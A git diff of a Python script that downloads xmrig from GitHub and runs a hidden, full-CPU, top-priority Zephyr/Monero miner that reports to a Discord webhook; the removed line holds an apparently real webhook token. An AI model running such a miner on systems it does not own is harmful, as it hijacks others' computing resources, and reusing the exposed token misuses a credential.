@@ -6,10 +6,9 @@ import socket
 import requests
 import json
 import tarfile
-import logging
 from urllib.request import urlretrieve
 
-WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # 🔁 Replace with your real Discord webhook
+WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"  # 🔁 Replace with your real Discord webhook
 WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker001"  # 🔁 Replace with your real Monero wallet
 POOL = "fr.zephyr.herominers.com:1123"  # You can customize this if needed
 
@@ -20,6 +19,7 @@ TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0
 os.makedirs(XM_DIR, exist_ok=True)
 
 # Set up logging
+import logging
 logging.basicConfig(filename=os.path.join(XM_DIR, "miner_log.txt"), level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -47,7 +47,7 @@ def notify(message):
     """Send a notification via Discord webhook"""
     try:
         response = requests.post(WEBHOOK, json={"content": message})
-        response.raise_for_status()  # Raises an HTTPError for bad responses
+        response.raise_for_status()  # Raise an error for bad responses (e.g., 404, 500)
         logging.info(f"Notification sent: {message}")
     except Exception as e:
         logging.error(f"Failed to send notification: {e}")
@@ -76,7 +76,7 @@ def start_miner():
             logging.error(f"Miner binary not found or not executable: {XM_BIN}")
             return False
 
-        cmd = [XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(os.cpu_count())]
+        cmd = ["nice", "-n", "-20", XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(os.cpu_count())]
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         logging.info("Miner started successfully.")
         return True
